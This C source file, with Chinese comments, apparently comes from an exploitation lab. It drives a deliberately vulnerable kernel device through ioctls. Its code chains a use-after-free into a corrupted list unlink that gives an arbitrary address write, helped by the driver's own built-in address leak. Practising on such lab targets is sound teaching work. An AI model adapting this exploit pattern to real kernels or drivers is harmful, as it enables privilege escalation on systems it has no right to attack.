/* 静态编译命令: gcc -D_GNU_SOURCE -static -Os -s -o exp exp.c */
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/uv_uaf_dev"
#define IOCTL_MAGIC 'X'

// --- 对应底层的 API 宏 ---
#define IOCTL_VUL_ALLOC _IOR(IOCTL_MAGIC, 0x01, int)
#define IOCTL_VUL_FREE _IOW(IOCTL_MAGIC, 0x02, int)
#define IOCTL_VUL_WRITE _IOW(IOCTL_MAGIC, 0x03, struct uv_req)
#define IOCTL_VIC_UNL_ALLOC _IOR(IOCTL_MAGIC, 0x10, int)
#define IOCTL_VIC_UNL_TRIG _IOW(IOCTL_MAGIC, 0x11, int)
#define IOCTL_LEAK _IOR(IOCTL_MAGIC, 0x20, struct uv_leak)
#define IOCTL_CHECK _IO(IOCTL_MAGIC, 0x21)

struct uv_req {
  int handler;
  int offset;
  unsigned long value;
};
struct uv_leak {
  unsigned long target_addr;
  unsigned long sink_addr;
};

static int fd;

// =========================================================================
// [1] 框架基石：用户态特征描述符 (ops)
// =========================================================================

// 漏洞原语抽象
typedef struct {
  const char *id;
  int obj_size;
  int (*alloc)(void);
  void (*free)(int handle);
  void (*blind_write)(int handle, int offset, unsigned long val);
} vuln_ops_t;

// 受害者对象抽象
typedef struct {
  const char *id;
  int obj_size;
  int trigger_offset_1;
  int trigger_offset_2;
  int (*occupy)(void);
  void (*trigger)(int handle);
} victim_ops_t;

// 战术剧本抽象
typedef struct {
  const char *id;
  void (*run)(vuln_ops_t *vul, victim_ops_t *vic, unsigned long target,
              unsigned long sink);
} mode_ops_t;

// =========================================================================
// [2] 实例化：将底层的 IOCTL 扁平接口，包装成面向对象的实体
// =========================================================================

// --- 组装 Vulobj ---
int v_alloc(void) {
  int h;
  ioctl(fd, IOCTL_VUL_ALLOC, &h);
  return h;
}
void v_free(int h) { ioctl(fd, IOCTL_VUL_FREE, &h); }
void v_write(int h, int off, unsigned long v) {
  struct uv_req r = {h, off, v};
  ioctl(fd, IOCTL_VUL_WRITE, &r);
}

vuln_ops_t vul_uaf = {.id = "VUL_UAF_512",
                      .obj_size = 512,
                      .alloc = v_alloc,
                      .free = v_free,
                      .blind_write = v_write};

// --- 组装 Vicobj ---
int vic_alloc(void) {
  int h;
  ioctl(fd, IOCTL_VIC_UNL_ALLOC, &h);
  return h;
}
void vic_trig(int h) { ioctl(fd, IOCTL_VIC_UNL_TRIG, &h); }

victim_ops_t vic_unlink = {.id = "VIC_UNLINK_MSG",
                           .obj_size = 512,
                           .trigger_offset_1 = 0, // next 的偏移
                           .trigger_offset_2 = 8, // prev 的偏移
                           .occupy = vic_alloc,
                           .trigger = vic_trig};

// =========================================================================
// [3] 战术板：Mode M1 的控制流编排
// =========================================================================
void m1_uaf_to_unlink(vuln_ops_t *vul, victim_ops_t *vic, unsigned long target,
                      unsigned long sink) {

  if (vul->obj_size != vic->obj_size) {
    printf("[-] Exploit failed: Topology mismatch (Vuln %d vs Vic %d).\n",
           vul->obj_size, vic->obj_size);
    return;
  }

  int v_fd = vul->alloc();
  vul->free(v_fd);
  int vic_fd = vic->occupy();

  vul->blind_write(v_fd, vic->trigger_offset_1, target - 8);
  vul->blind_write(v_fd, vic->trigger_offset_2, sink);

  vic->trigger(vic_fd);
}

mode_ops_t mode_m1 = {.id = "MODE_M1_UAF_UNLINK_AAW", .run = m1_uaf_to_unlink};

// =========================================================================
// [4] 主干入口
// =========================================================================
int main() {

  fd = open(DEVICE_PATH, O_RDWR);
  if (fd < 0) {
    perror("[-] Failed to open device! Did you 'sudo chmod 666'?");
    return -1;
  }

  struct uv_leak l = {0};
  if (ioctl(fd, IOCTL_LEAK, &l) < 0) {
    perror("[-] Leak failed!");
    close(fd);
    return -1;
  }

  mode_m1.run(&vul_uaf, &vic_unlink, l.target_addr, l.sink_addr);
  ioctl(fd, IOCTL_CHECK);

  printf("[+] Exploit chain finished. Check dmesg for output!\n");
  printf("=======================================\n");

  close(fd);
  return 0;
}